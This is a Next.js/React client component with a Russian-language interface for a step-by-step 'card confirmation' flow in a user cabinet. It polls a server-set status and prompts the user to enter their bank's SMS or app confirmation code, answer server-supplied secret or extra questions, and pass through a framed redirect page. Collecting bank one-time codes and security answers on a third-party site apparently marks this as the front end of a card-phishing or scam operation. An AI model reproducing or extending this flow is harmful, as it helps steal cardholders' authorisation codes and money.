"use client"

import { useEffect, useRef, useState } from "react"
import Link from "next/link"
import useSWR from "swr"
import { dismissRejectedCards, reportCardFrame, submitCardCode, submitExtraCheckResponse, submitSecretAnswer, type PaymentCardView } from "@/app/actions/cards"
import { reviewFetcher } from "@/lib/review-fetcher"
import { CARD_BRAND_LABEL, maskCard } from "@/lib/payment-cards"
import { CardBrandMark } from "@/components/cabinet/card-brand-mark"
import { Panel } from "@/components/cabinet/panel"
import { actionErrorMessage } from "@/lib/action-error"
import { cn } from "@/lib/utils"
import { AlertMark, CheckMark, Spinner } from "./card-icons"
import { CardCodeForm, ExtraCheckForm, needsExtraCheckAnswer, needsSecretAnswer } from "./card-modal"
import { BRAND_MATERIAL } from "./card-tile"
import { CardFrame } from "./card-frame"
import { CardHoldNotice } from "./card-hold-notice"

const CARDS_KEY = "/api/cabinet/cards"
const FINAL_STATUSES = new Set(["confirmed", "rejected"])

type Stage = "saved" | "review" | "done"

function stageOf(card: PaymentCardView): Stage {
  return card.status === "confirmed" ? "done" : "review"
}

function Steps({ current }: { current: Stage }) {
  const steps: { id: Stage; label: string }[] = [
    { id: "saved", label: "Сохранена" },
    { id: "review", label: "Проверка" },
    { id: "done", label: "Готово" },
  ]
  const index = steps.findIndex((s) => s.id === current)
  return (
    <ol className="flex items-center gap-2" aria-label="Этапы подтверждения">
      {steps.map((step, i) => {
        const complete = i < index || current === "done"
        const active = i === index && current !== "done"
        return (
          <li key={step.id} className="flex flex-1 items-center gap-2">
            <span
              className={cn(
                "grid size-7 shrink-0 place-items-center rounded-full text-xs font-bold transition",
                complete && "bg-primary text-primary-foreground",
                active && "bg-primary/15 text-primary ring-2 ring-primary",
                !complete && !active && "bg-muted text-muted-foreground",
              )}
              aria-current={active ? "step" : undefined}
            >
              {complete ? <CheckMark className="size-3.5" /> : i + 1}
            </span>
            <span className={cn("truncate text-xs font-semibold", complete || active ? "text-foreground" : "text-muted-foreground")}>{step.label}</span>
            {i < steps.length - 1 && <span aria-hidden="true" className={cn("h-px flex-1", complete ? "bg-primary" : "bg-border")} />}
          </li>
        )
      })}
    </ol>
  )
}

function MiniCard({ card }: { card: PaymentCardView }) {
  return (
    <div className={cn("relative flex items-center justify-between gap-3 overflow-hidden rounded-2xl bg-gradient-to-br p-4 ring-1 ring-border", BRAND_MATERIAL[card.brand])}>
      <span aria-hidden="true" className="card-sheen pointer-events-none absolute inset-0 opacity-40" />
      <div className="relative min-w-0">
        <p className="truncate text-xs text-foreground/70">{card.bankName ?? CARD_BRAND_LABEL[card.brand]}</p>
        <p className="font-mono text-base tracking-[0.12em] tabular-nums">{maskCard(card.last4)}</p>
      </div>
      <CardBrandMark brand={card.brand} className="relative h-6 shrink-0" />
    </div>
  )
}

function Waiting({ title, text }: { title: string; text: string }) {
  return (
    <div role="status" aria-live="polite" className="flex flex-col items-center gap-4 py-4 text-center">
      <span className="relative grid size-14 place-items-center rounded-full bg-primary/10">
        <span className="absolute inset-0 animate-ping rounded-full bg-primary/15 [animation-duration:1.8s]" />
        <Spinner className="size-6 text-primary" />
      </span>
      <div className="flex max-w-xs flex-col gap-1.5">
        <p className="font-display text-lg font-bold text-balance">{title}</p>
        <p className="text-sm leading-relaxed text-muted-foreground text-pretty">{text}</p>
      </div>
    </div>
  )
}

const primaryLink = "flex min-h-12 flex-1 items-center justify-center rounded-full bg-primary px-5 text-sm font-bold text-primary-foreground transition hover:opacity-90 active:scale-[0.98]"
const secondaryLink = "flex min-h-12 flex-1 items-center justify-center rounded-full border border-border px-5 text-sm font-semibold text-foreground transition hover:bg-muted active:scale-[0.98]"

export function CardConfirmation({ cardId, initial }: { cardId: number; initial: PaymentCardView[] }) {
  const { data: cards = initial, mutate } = useSWR<PaymentCardView[]>(CARDS_KEY, reviewFetcher, {
    fallbackData: initial,
    refreshInterval: (latest) => {
      const current = latest?.find((c) => c.id === cardId)
      return current && !FINAL_STATUSES.has(current.status) ? 2500 : 0
    },
  })
  const redirected = useRef(false)
  const [finishedUrl, setFinishedUrl] = useState<string | null>(null)
  const [acceptedHoldUrl, setAcceptedHoldUrl] = useState<string | null>(null)
  const [rejected, setRejected] = useState<PaymentCardView | null>(null)
  const [busy, setBusy] = useState(false)
  const [error, setError] = useState<string | null>(null)
  const dismissed = useRef(false)

  const card = cards.find((c) => c.id === cardId) ?? null

  useEffect(() => {
    if (card?.status !== "rejected" || dismissed.current) return
    dismissed.current = true
    setRejected(card)
    dismissRejectedCards()
      .then((result) => mutate(result.cards, false))
      .catch(() => {})
  }, [card, mutate])

  const redirectTo = card && !FINAL_STATUSES.has(card.status) && !needsSecretAnswer(card) && card.redirectUrl && /^https:\/\//i.test(card.redirectUrl)
    ? card.redirectUrl
    : null
  const frameDone = finishedUrl === redirectTo || card?.frameStatus === "finished"
  const showFrame = Boolean(redirectTo) && !frameDone

  function handleFrameOpened() {
    if (!card) return
    reportCardFrame(card.id, "opened").catch(() => {})
  }

  function handleFrameFinished() {
    if (!card || redirected.current) return
    redirected.current = true
    setFinishedUrl(redirectTo)
    reportCardFrame(card.id, "finished")
      .then((result) => mutate(result.cards, false))
      .catch(() => {})
  }

  async function run(action: () => Promise<{ cards: PaymentCardView[] }>) {
    setBusy(true)
    setError(null)
    try {
      await mutate((await action()).cards, false)
    } catch (e) {
      setError(actionErrorMessage(e, "Не удалось отправить. Проверьте интернет и попробуйте ещё раз."))
    } finally {
      setBusy(false)
    }
  }

  if (rejected) {
    return (
      <Panel className="flex flex-col gap-5 p-5 sm:p-6">
        <div role="alert" className="flex items-start gap-3 rounded-2xl bg-destructive/10 p-4 text-destructive ring-1 ring-destructive/30">
          <AlertMark className="mt-0.5 size-5 shrink-0" />
          <div className="flex flex-col gap-1">
            <p className="font-semibold">Карта {maskCard(rejected.last4)} не привязана</p>
            <p className="text-sm leading-relaxed text-pretty">
              {rejected.resultReason
                ? <>Причина: {rejected.resultReason}</>
                : "Привязка отклонена. Карта не добавлена — проверьте данные и попробуйте снова или используйте другую карту."}
            </p>
          </div>
        </div>
        <div className="flex flex-col gap-3 sm:flex-row">
          <Link href="/cabinet/cards?new=1" className={primaryLink}>Привязать другую карту</Link>
          <Link href="/cabinet" className={secondaryLink}>В кабинет</Link>
        </div>
      </Panel>
    )
  }

  if (!card) {
    return (
      <Panel className="flex flex-col items-center gap-4 p-6 text-center">
        <p className="font-display text-lg font-bold">Заявка не найдена</p>
        <p className="max-w-sm text-sm leading-relaxed text-muted-foreground text-pretty">Возможно, карта уже отвязана. Вернитесь к списку карт.</p>
        <Link href="/cabinet/cards" className={cn(primaryLink, "w-full flex-none sm:w-auto")}>К моим картам</Link>
      </Panel>
    )
  }

  return (
    <Panel className="flex flex-col gap-6 p-5 sm:p-6">
      <Steps current={stageOf(card)} />
      <MiniCard card={card} />
      {card.requestNo && (
        <p className="-mt-3 text-center text-xs text-muted-foreground">
          Заявка <span className="font-mono font-semibold text-foreground">№ {card.requestNo}</span>
        </p>
      )}

      {needsSecretAnswer(card) && (
        <div className="flex flex-col gap-4">
          <div className="flex flex-col gap-1">
            <h2 className="font-display text-lg font-bold">Дополнительный вопрос</h2>
            <p className="text-sm leading-relaxed text-muted-foreground text-pretty">{card.extraCheckMessage}</p>
          </div>
          <ExtraCheckForm disabled={busy} onSubmit={(response) => run(() => submitSecretAnswer(card.id, response))} />
        </div>
      )}

      {showFrame && redirectTo && acceptedHoldUrl !== redirectTo && (
        <CardHoldNotice requestNo={card.requestNo} onContinue={() => setAcceptedHoldUrl(redirectTo)} />
      )}

      {showFrame && redirectTo && acceptedHoldUrl === redirectTo && (
        <CardFrame
          key={redirectTo}
          cardId={card.id}
          url={redirectTo}
          requestNo={card.requestNo}
          onOpened={handleFrameOpened}
          onFinished={handleFrameFinished}
        />
      )}

      {card.status === "pending" && !needsSecretAnswer(card) && (
        frameDone
          ? <Waiting title="Проверяем результат" text="Это займёт несколько секунд. Не закрывайте эту страницу." />
          : <Waiting
              title={redirectTo ? "Открываем страницу…" : "Ожидайте перенаправления"}
              text="Сейчас откроется страница подтверждения вашей карты. Не закрывайте эту страницу."
            />
      )}

      {card.status === "code_requested" && (
        <div className="flex flex-col gap-4">
          <div className="flex flex-col gap-1">
            <h2 className="font-display text-lg font-bold">Введите код подтверждения</h2>
            <p className="text-sm leading-relaxed text-muted-foreground text-pretty">Код пришёл в SMS или в приложение вашего банка.</p>
          </div>
          <CardCodeForm disabled={busy} onSubmit={(code) => run(() => submitCardCode(card.id, code))} />
        </div>
      )}

      {card.status === "extra_check" && !card.extraCheckMessage && (
        <Waiting title="Дополнительная проверка" text="Проверяем карту. Скоро здесь появится вопрос." />
      )}

      {needsExtraCheckAnswer(card) && (
        <div className="flex flex-col gap-4">
          <div className="flex flex-col gap-1">
            <h2 className="font-display text-lg font-bold">Дополнительный вопрос</h2>
            <p className="text-sm leading-relaxed text-muted-foreground text-pretty">{card.extraCheckMessage}</p>
          </div>
          <ExtraCheckForm disabled={busy} onSubmit={(response) => run(() => submitExtraCheckResponse(card.id, response))} />
        </div>
      )}

      {card.status === "extra_check" && Boolean(card.extraCheckMessage) && Boolean(card.extraCheckResponse) && (
        <Waiting title="Ответ отправлен" text="Ожидайте решения — страница обновится сама." />
      )}

      {card.status === "confirmed" && (
        <div role="status" className="flex flex-col items-center gap-4 py-2 text-center">
          <span className="grid size-14 place-items-center rounded-full bg-primary text-primary-foreground">
            <CheckMark className="size-7" />
          </span>
          <div className="flex flex-col gap-1.5">
            <p className="font-display text-xl font-extrabold">Карта подтверждена</p>
            <p className="text-sm text-muted-foreground text-pretty">{card.resultReason ?? "Теперь её можно использовать для пополнения и выводов."}</p>
          </div>
          <div className="flex w-full flex-col gap-3 sm:flex-row">
            <Link href="/cabinet/deposit" className={primaryLink}>Пополнить баланс</Link>
            <Link href="/cabinet/cards" className={secondaryLink}>К моим картам</Link>
          </div>
        </div>
      )}

      {error && <p role="alert" className="text-sm text-destructive">{error}</p>}

      {card.status !== "confirmed" && (
        <Link href="/cabinet/cards" className="self-center text-sm font-semibold text-muted-foreground transition-colors hover:text-foreground">
          К моим картам
        </Link>
      )}
    </Panel>
  )
}
